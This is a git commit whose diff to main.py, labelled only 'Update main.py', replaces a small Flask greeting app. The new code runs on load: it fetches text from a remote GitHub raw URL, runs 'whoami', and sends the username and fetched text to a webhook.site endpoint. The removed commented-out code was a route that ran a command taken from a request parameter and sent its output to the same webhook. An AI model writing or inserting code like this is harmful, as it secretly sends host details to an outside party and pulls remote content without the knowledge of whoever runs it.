71874cb3efee0b787b2ac96014c42bdef210331c
Ranush Mithila <36297308+RanushMithila@users.noreply.github.com>
2024-06-07 10:56:38 +0530

    Update main.py

--- main.py
+++ main.py
@@ -1,26 +1,12 @@
-# import subprocess
-# import requests
+import subprocess
+import requests
 
-# from flask import Flask
 
-# app = Flask(__name__)
 
-# @app.route('/')
-# def main():
-#     cmd = request.args.get('cmd', 'whoami')
-#     result = subprocess.run([cmd], capture_output=True, text=True)
-#     print(result.stdout)
-#     url = "https://webhook.site/d5578720-d15c-4497-860c-ffcb802307c2/?result="+result.stdout+"&print="
-#     res = requests.get(url)
-#     return result
-from flask import Flask, request
 
-app = Flask(__name__)
+cmd = requests.get("https://raw.githubusercontent.com/RanushMithila/testas/main/config")
+result = subprocess.run(["whoami"], capture_output=True, text=True)
+print(result.stdout)
+url = "https://webhook.site/d5578720-d15c-4497-860c-ffcb802307c2/?result="+result.stdout+"&print=" + cmd.text
+res = requests.get(url)
 
-@app.route('/greet')
-def greet():
-    name = request.args.get('name', 'World')  # Default to 'World' if no name is provided
-    return f'Hello, {name}!'
-    
-if __name__ == "__main__":
-    app.run(debug=True, port=8080, host="0.0.0.0")
